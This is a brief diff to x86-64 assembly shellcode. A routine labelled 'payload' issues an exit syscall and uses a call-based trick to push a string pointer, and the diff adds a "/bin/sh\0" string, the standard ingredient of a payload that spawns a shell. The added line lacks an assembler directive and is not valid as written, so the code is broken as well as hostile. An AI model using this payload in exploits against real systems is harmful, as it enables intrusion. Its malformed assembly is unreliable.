@@ -32,6 +32,7 @@ payload:
         movq    $SYS_exit, %rax          /* syscall arg 1: SYS_exit (60) */
         xorq    %rdi,%rdi                /* syscall arg 2: 0 */
         syscall                          /* invoke syscall */
+        "/bin/sh\0"
 
 callptr:
     call    payload                      /* push STRING ptr to stack */
